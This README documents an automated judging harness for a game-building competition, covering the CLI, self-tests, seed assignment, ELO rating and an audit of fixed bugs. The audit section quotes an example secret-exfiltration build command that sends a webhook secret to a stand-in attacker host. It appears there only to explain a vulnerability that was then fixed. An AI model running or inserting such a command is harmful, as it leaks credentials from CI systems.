# ASSAY harness (Gate A)

Automated judging harness buat ASSAY (AI Pilot Arena) -- BYOT game-build submissions dinilai
otomatis: build -> serve -> browser check -> skor + flag anti-prebuilt.

## Jalanin judge

```
npm run judge -- --submission <dir> --participant <id> --brief <brief-id> --seed '<json>' --track <casual|competitive|final>
```

Optional: `--division`, `--out`, `--t0`, `--repoCreatedAt`.

Brief yang tersedia (`briefs/`): `01-endless-runner`, `02-platformer-gravity-flip`,
`03-memory-reshuffle`, `10-idle-clicker-prestige`.

**Windows/PowerShell**: `npm run judge` lewat npm.cmd bikin PowerShell rewrite argumen
yang ada `"` di dalamnya (kejadian nyata, bukan hipotetis). Pakai stop-parsing token:

```powershell
npm run judge -- --% --submission .\sub --participant x --brief 01-endless-runner --seed "{\"theme\":\"contoh\"}" --track casual
```

## Self-test (bukti, bukan klaim)

```
npm run test:unit    # pure Node, gak butuh browser -- aggregate() + spearman() math
npm run selftest     # jalanin harness beneran lewat browser lawan 3 fixture publik
npm run spearman     # sama fixture, tapi assert URUTAN skor match urutan kualitas (ranking validity)
```

`npm run selftest` beneran jalanin harness lawan 3 fixture publik (auto-clone kalau belum
ada lokal): `assay-sample-good`, `assay-dummy-jelek`, `assay-dummy-curang`. Assert pola:

| Fixture | Ekspektasi |
|---|---|
| good | score 100, tanpa flag, `ratable: true` |
| jelek | score turun (bug fungsional nyata: restart gak reset, skor macet) tapi TIDAK kena `SEED_MISMATCH`, tetap `ratable: true` |
| curang | kena flag `SEED_MISMATCH(prebuilt?)`, `ratable: false`, dan **score HARUS lebih rendah dari jelek** (invarian integritas -- lihat "Fix 2026-07-11" di bawah) |

`npm run spearman` menghitung Spearman rank correlation (`src/score/spearman.ts`) antara
skor harness dan urutan kualitas yang disepakati manusia (good > jelek > curang). Assert
`rho === 1`. Ini regression guard buat "apakah ranking-nya bener", bukan bukti akurasi
statistik -- n=3 kekecilan buat itu (lihat Known gaps).

Kalau script-script ini gak ada di `package.json` atau file test-nya gak ke-commit --
JANGAN percaya klaim "Gate A closed" di dokumen manapun sampai lo jalanin sendiri dan cek
exit code-nya.

```
npm run selftest:briefs        # brief 02/03/10 lawan fixtures/multi-* LOKAL (belum di-push kemana2)
npm run verify-fixtures-jsdom  # sanity check cepat (jsdom, BUKAN Playwright asli) buat fixture di atas
```

## Seed assignment buat event beneran (bukan pool statis lagi)

```
npm run assign-seeds -- --brief 01-endless-runner --participants participants.txt --salt "rahasia-jam1" --out out/seeds.json
```

`config/seed_pool.json` (4-6 entri) HANYA buat contoh/dev lokal. Assignment beneran pakai
`config/seed_space.json` (ratusan-ribuan kombinasi per brief, lihat `src/seed/space.ts` +
`src/seed/assign.ts`) -- collision-free DIJAMIN dalam 1 event (bukan cuma "kemungkinan
kecil"), lewat hash(participant+salt) + open-addressing. Salt WAJIB dirahasiain sampai
window mulai (lihat "Live event ops" di bawah).

## Live event: orkestrasi + rating

```
npm run tournament -- --owner <gh-owner> --repo assay --roster out/roster.json --seeds out/seeds.json --brief 01-endless-runner
npm run elo-round -- --brief 01-endless-runner --roster out/roster.json --salt "rahasia-round1" --out out/round_pairs.json
npm run elo-apply -- --pairs out/round_pairs.json --results out/_tournament/results.json
```

`scripts/run_tournament.ts` -- trigger + poll N judge run lewat GitHub Actions REST API
(gantiin klik manual `workflow_dispatch` satu-satu), tarik `score.json` dari tiap
artifact, cetak leaderboard. Butuh `GH_TOKEN` env var (PAT scope `repo`+`workflow`).
**BELUM PERNAH DITES LAWAN GITHUB BENERAN** (sandbox yang nulis ini nggak punya token) --
coba dulu lawan 2-3 peserta dummy sebelum dipercaya buat 50 peserta beneran.

`src/elo/*` -- rating competitive track, HARNESS-ONLY (nol human judge). Detail formula,
K-factor, draw margin, forfeit rule ada di "Rating (ELO) -- competitive track" di bawah.

## Fix 2026-07-11 (audit sesi ini -- 3 masalah nyata, semua sudah diperbaiki + ada test)

1. **Secret exfiltration lewat `build_cmd`.** `build_cmd` di `arena.json` dikontrol
   PENUH oleh peserta dan sebelumnya dijalankan lewat `execSync` yang inherit
   `process.env` -- artinya `LLM_API_KEY`/`DISCORD_WEBHOOK` di job CI bisa dicuri
   cukup dengan `build_cmd: "curl evil.com?d=$DISCORD_WEBHOOK"`. Fix: (a)
   `src/util.ts` nambah `shUntrusted()` yang strip env ke minimal (PATH/HOME doang)
   buat semua command yang datang dari manifest peserta, dipakai di
   `src/gates/build.ts`; (b) `.github/workflows/judge.yml` dipecah jadi 2 job --
   `judge` (jalanin code peserta, NOL secret) dan `notify` (pegang
   `DISCORD_WEBHOOK`, cuma baca `score.json` yang udah jadi, gak pernah eksekusi
   apapun dari repo peserta). Isolasi di level infra (VM terpisah), bukan cuma
   strip env di level proses. `LLM_API_KEY` juga dihapus dari workflow karena
   0 match penggunaan di `src/` -- exposure tanpa fungsi.
2. **Cheat bisa outrank submission jujur.** Sebelumnya `spec_seed` = rata-rata biasa
   dari SEMUA check (fungsional + seed) -- jadi 1 seed-check gagal cuma nyenggol
   skor beberapa persen kalau briefnya punya banyak check lain. Bukti nyata:
   fixture `curang` (cheat, `SEED_MISMATCH`) skor **92**, fixture `jelek` (jujur,
   ada bug beneran) skor **84** -- cheat menang. Fix: `src/cli.ts` sekarang
   ngitung `spec_seed = nonSeedPassFraction * seedPassFraction` (perkalian, bukan
   rata-rata) -- seed gagal total collapse komponen ke 0, proporsional kalau brief
   ke depan punya >1 seed-check. Submission apapun yang `SEED_FAIL` juga
   ditandain `ratable: false` di `JudgeResult` -- eksplisit gak boleh dipakai buat
   hitung rating sampai direview manusia. `tests/selftest.ts` sekarang assert
   `curang.score < jelek.score` sebagai invarian keras, bukan cuma cek flag ada.
3. **Klaim "track renormalization belum fixed" di README lama itu SENDIRI sudah
   basi** -- commit `e24da9c` udah benerin bug cap ~70/60 itu, tapi README
   sebelumnya masih bilang belum. Dibuktikan lewat `npm run test:unit`
   (`tests/aggregate.unit.ts`), bukan diklaim ulang doang.

## Live event ops -- seed privacy & salt (jawaban buat "submission private sampe window ditutup")

`judge.yml` nge-`git clone` repo peserta TANPA auth -- artinya repo peserta WAJIB publik
biar bisa di-clone. Konsekuensinya: repo itu bisa dibuka SIAPA AJA, KAPAN AJA, termasuk
peserta lain, SELAMA window masih jalan (bukan cuma setelah selesai). Kalau 2 peserta
kebetulan dapet seed yang identik, salah satu bisa buka repo publik yang lain, liat
seed-nya cocok, dan copy implementasinya mentah-mentah -- harness gak bisa bedain "nulis
sendiri" vs "nyalin karena kebetulan seed sama".

Fix di sesi ini ADA di kode (`config/seed_space.json` + `src/seed/assign.ts` -- cardinality
gede + collision-free-by-construction), tapi itu cuma ngilangin risiko "seed sama". Risiko
LAIN yang independen dari collision: peserta bisa liat *pendekatan/kode* peserta lain (studi
gaya, bukan verbatim-copy) selagi window masih jalan, walau seed beda. Itu bukan sesuatu
yang bisa di-fix di level kode -- pilihannya proses:
- **Salt rahasia** (udah diimplementasi): jangan umumin `--salt` ke `assign-seeds`/`run_elo_round`
  sebelum window mulai. Peserta gak bisa precompute/prebuild seed spesifik sebelum tau
  saltnya, walau mereka lomba bikin script tebak-tebakan.
- **Window pendek**: makin pendek waktu antara "seed diumumin" dan "submission ditutup",
  makin kecil peluang orang sempat browsing+niru repo orang lain secara efektif.

**KEPUTUSAN (2026-07-11, sebelum outreach ke peserta asing):** tetap **PUBLIC repo** buat
Season 0 (event pertama). JANGAN blokir outreach demi bangun private-repo pipeline dulu.
Alasan:
- Risiko yang paling parah (2 peserta collision seed -> copy verbatim dijamin ke-cover
  bagus) UDAH ditutup sesi ini (seed-space collision-free by construction).
- Risiko yang TERSISA (peserta laen bisa liat *gaya/pendekatan* kode peserta laen selama
  window, independen dari collision) itu risiko sosial/style, BUKAN hard-exploit yang
  nembus scoring -- severity rendah buat event pertama dengan kohort kecil/dikenal
  (komunitas Discord), beda kasus sama pendaftaran publik terbuka tanpa batas.
- Fix yang bener (authenticated clone ke repo private) butuh job baru (`fetch` job pegang
  `CLONE_PAT`, clone, upload artifact -> `judge` job turun dari artifact, ZERO secret,
  biar gak balikin bug #1 [secret exfiltration] yang baru ditutup sesi ini) -- real dev
  time yang sekarang gak available (budget waktu abis di Gate A hardening), bukan trivial
  toggle "private" doang.
- Mitigasi proses yang udah ada (salt rahasia + window pendek) cukup buat level risiko ini.

**Wajib dilakuin sebelum kirim outreach:** cantumin eksplisit di ruleset/rules publik --
"submission repo bersifat PUBLIC selama window kompetisi berlangsung, jangan anggap kode
kalian confidential sampai window ditutup." Disclosure eksplisit, bukan silent risk.

**Trigger buat revisit** (baru bangun private-repo pipeline kalau salah satu kejadian):
(a) buka pendaftaran publik tanpa vetting/gak dikenal, (b) ada hadiah/stake reputasi yang
bikin nyontek-gaya worth it, (c) ada 1 komplain nyata dari peserta soal ditiru. Desain
fix-nya kalau saatnya tiba: job baru `fetch` (pegang `CLONE_PAT` secret, clone repo private
peserta lewat token, upload hasil clone sebagai artifact) -> job `judge` (turun dari
artifact, ZERO secret, jalanin `build_cmd` -- gak reintroduce bug #1) -> job `notify` (sama
kayak sekarang). Peserta invite bot/service account sebagai read-only collaborator di repo
private mereka sebelum submit.

## GitHub Actions -- concurrency & minutes (cek sebelum trigger banyak run bareng)

Per [docs resmi GitHub](https://docs.github.com/en/actions/reference/limits) (dicek
2026-07-11):
- **Free**: 20 concurrent job (standard GitHub-hosted runner), **account-wide** (semua
  repo di akun itu gabung ke 1 kuota, bukan per-repo).
- **Pro**: 40 concurrent job -- **$4/user/bulan**.
- Job yang ngelewatin limit **di-queue otomatis** oleh GitHub, BUKAN gagal/cancel. Trigger
  50 run bareng di Free tier itu AMAN secara korektnes -- cuma nambah wall-clock time
  (batch berikutnya nunggu slot kosong).

Hitungan kasar 50 peserta brief 01 di Free tier (asumsi ~2-4 menit/run: `npm ci` +
`playwright install --with-deps chromium` + build + check): 50 run / 20 slot ~ 3 batch ->
nambah kira-kira 2x waktu 1 run (~5-8 menit) ke total wall-clock dibanding paralel penuh.
BUKAN blocker, cuma bikin leaderboard ngisi lebih lambat kalau komunitas nungguin live.

**Rekomendasi:** upgrade ke GitHub Pro ($4/bulan, jauh di bawah hard-cap Season 0 <$50)
SEBELUM hari-H kalau mau dobelin slot jadi 40 dan ngurangin friction pas ditonton
komunitas -- **opsional**, bukan wajib buat korektnes hasil.

**Optimasi belum dikerjain** (bukan blocker sekarang, tapi buang waktu tiap run): `judge.yml`
gak nge-`actions/cache` `node_modules` atau Playwright browser binary -- tiap 1 dari 50 run
bayar penuh cost `npm ci` + `playwright install --with-deps chromium` (~1-2 menit sendiri)
dari nol tiap kali. Fix: tambah `actions/cache` step keyed di `package-lock.json` buat
`node_modules` + `~/.cache/ms-playwright`. Belum urgent (2000 menit/bulan kuota Free masih
jauh dari abis buat 50 run sekali event), tapi kepake begitu frequency event naik.

## Rating (ELO) -- competitive track

`src/elo/*` + `config/elo.json`. **Harness-only, NOL human judge** -- murni skor
`judgeSubmission()` vs `judgeSubmission()`, bukan panel/human (itu konsep terpisah, buat
track `final` di `weights.json`).

- Rating awal: **1000** buat semua peserta baru.
- K-factor by experience (`src/elo/rating.ts` + `k_tiers` di `config/elo.json`): **40**
  (game 1-5, provisional), **24** (game 6-20, established), **12** (game 21+, veteran).
- Expected score: formula standar chess-style `E = 1 / (1 + 10^((Rb-Ra)/400))`.
- **Draw margin 3 poin**: selisih skor harness <= 3 dianggap draw, bukan win/loss --
  nyerap noise (golden set validasi cuma n=3, lihat "Known gaps"), bukan sinyal skill
  beneran beda.
- **Invarian anti-cheat paling penting** (`src/elo/match.ts`): submission `ratable: false`
  (flagged/build-fail) **OTOMATIS KALAH** lawan submission `ratable: true`, WALAU skor
  numeriknya lebih tinggi. Diuji eksplisit di `tests/elo.unit.ts`, lulus. Kalau
  KEDUANYA `ratable: false` -> `double_forfeit`, NOL perubahan rating (bukan draw normal),
  tapi tetep kehitung 1 game buat progres K-tier.
- Matchmaking (`src/elo/pairing.ts`): pasang by kedekatan rating, hindari rematch kalau
  ada kandidat laen, 1 bye kalau jumlah peserta ganjil.
- Rank tier (`tierFor()` di `src/elo/tiers.ts`): Perunggu (semua orang) -> Perak (1050+)
  -> Emas (1150+) -> Platina (1300+), tiap tier ngebuka brief pool lebih luas (01 saja ->
  01+02 -> 01+02+03 -> semua 4 brief).
  **Update 2026-07-11**: `config/elo.json` nge-gate tier di atas Perunggu di belakang
  "brief 02/03/10 punya dummy validation lewat harness beneran (bukan cuma jsdom)" --
  syarat itu SEKARANG TERPENUHI (`npm run selftest:briefs` lulus 100%, lihat commit fix
  brief 10). Gate boleh dibuka. **TAPI** `min_rating` threshold (1050/1150/1300) masih
  tebakan awal ("Neb pick"), belum dikalibrasi lawan distribusi rating asli -- recalibrate
  setelah Season 0 round 1 ada data match beneran.

## Known gaps (JANGAN anggap ini "selesai" sampai poin di bawah diselesaikan/di-acknowledge)

- **n=3 di golden set** (`npm run spearman`) kekecilan buat klaim akurasi statistik --
  cuma regression guard "urutan bener", bukan bukti "harness akurat". Perlu golden set
  lebih besar (10-20+ submission asli) sebelum klaim "harness valid" ke publik.
- **`scripts/run_tournament.ts` belum pernah dites lawan GitHub beneran** -- logic-nya
  udah direview, tapi WAJIB dicoba lawan 2-3 peserta dummy dulu sebelum dipercaya buat
  50 peserta beneran (nama field API GitHub bisa aja beda dari asumsi kode).
  **STATUS 2026-07-11**: masih belum dites (butuh `GH_TOKEN` + repo asli di tangan Ben).
- **ELO belum dikalibrasi lawan data match asli** -- K-factor, draw margin, rank tier
  threshold semua "Neb pick" pertama, bukan hasil analisis data. Revisit setelah round 1.
- **Submission repo public selama window** -- lihat keputusan di "Live event ops" di atas.
  Disclosure wajib ke peserta, bukan silent risk.
- **Judge job gak nge-cache dependency/browser binary** -- lihat "GitHub Actions --
  concurrency & minutes" di atas. Buang waktu, gak buang duit (masih dalam kuota free).
- **Perf & a11y component di `weights.json` di-nol-in** (belum diimplementasi) --
  `aggregate()` udah di-renormalize biar ini gak diam-diam nge-cap skor akhir (lihat Fix
  2026-07-11 poin 3), tapi kalau nanti diimplementasi, tes ulang `tests/aggregate.unit.ts`.
- **Brief 02/03/10 -- RESOLVED 2026-07-11**: sebelumnya cuma jsdom-verified (belum lewat
  Playwright beneran). Ditemuin 1 bug nyata pas dites beneran: `briefs/10-idle-clicker-
  prestige.ts` nge-tag check `prestige` sebagai `seed: true` padahal itu check fungsional
  biasa (pakai `seed.costCurve` cuma sebagai parameter, bukan sinyal anti-prebuilt) --
  bikin gate multiplicative (`spec_seed = nonSeedFrac * seedFrac`) di `cli.ts` collapse
  salah: `jelek` (bug jujur) ke-flag `SEED_FAIL`/`ratable:false` padahal harusnya tetep
  ratable, dan `curang` gak ke-flag `SEED_MISMATCH` yang seharusnya HARUS ke-flag, plus
  `curang` dan `jelek` collision di skor yang sama (68=68), ngelanggar invarian
  "curang < jelek". Fix: retag `prestige` jadi `seed: false` (konsisten sama pola brief
  01/02/03 -- HANYA 1 check yang boleh `seed: true` per brief, yaitu check
  "nilai seed hadir di visible text"). `npm run selftest:briefs` sekarang 100% lulus
  (dites beneran lewat Playwright, bukan cuma jsdom). Brief 02/03/10 TERVALIDASI.